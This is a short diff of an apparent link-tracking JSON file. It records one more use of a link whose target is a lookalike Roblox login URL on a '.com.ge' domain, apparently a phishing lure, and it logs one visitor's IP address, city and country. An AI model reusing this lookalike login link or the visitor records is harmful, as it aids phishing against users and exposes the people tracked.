@@ -158,7 +158,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1309,
+    "useCount": 1310,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10632,6 +10632,14 @@
         "city": "Yilan",
         "flag": "🇹🇼",
         "countryCode": "TW"
+      },
+      {
+        "timestamp": 1777380779556,
+        "ip": "176.124.134.89",
+        "country": "Ukraine",
+        "city": "Mamayvtsi",
+        "flag": "🇺🇦",
+        "countryCode": "UA"
       }
     ]
   },
